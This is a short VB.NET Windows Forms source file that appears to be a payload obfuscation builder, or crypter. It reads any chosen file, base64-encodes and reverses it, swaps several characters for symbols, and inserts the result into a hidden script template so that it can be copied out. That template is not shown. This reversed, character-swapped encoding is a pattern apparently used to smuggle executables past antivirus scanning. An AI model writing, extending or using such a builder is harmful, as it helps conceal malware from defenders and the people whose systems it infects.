Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports WindowsApp19.My.Resources
Public Class Form1

	Private Sub _Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
		Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
		Dim openFileDialog2 As OpenFileDialog = openFileDialog
		openFileDialog2.ShowDialog()
		Me.cmd.Text = openFileDialog.FileName
		Me.strs.Text = Conversions.ToString(Me.Encode(Strings.StrReverse(Convert.ToBase64String(File.ReadAllBytes(Me.cmd.Text)))))
		Me.func.Text = Resources.dddssss.Replace("%str%", Conversions.ToString(Me.Encode(Strings.StrReverse(Convert.ToBase64String(File.ReadAllBytes(Me.cmd.Text))))))
	End Sub


	Public Function Encode(str As Object) As Object
		Return RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(str, Nothing, "Replace", New Object() {"A", "@"}, Nothing, Nothing, Nothing), Nothing, "Replace", New Object() {"T", "×"}, Nothing, Nothing, Nothing), Nothing, "Replace", New Object() {"V", "÷"}, Nothing, Nothing, Nothing))
	End Function


	Private Sub _Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
		Me.strs.SelectAll()
		Me.strs.Copy()
	End Sub


	Private Sub _Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
		Me.func.SelectAll()
		Me.func.Copy()
	End Sub

End Class
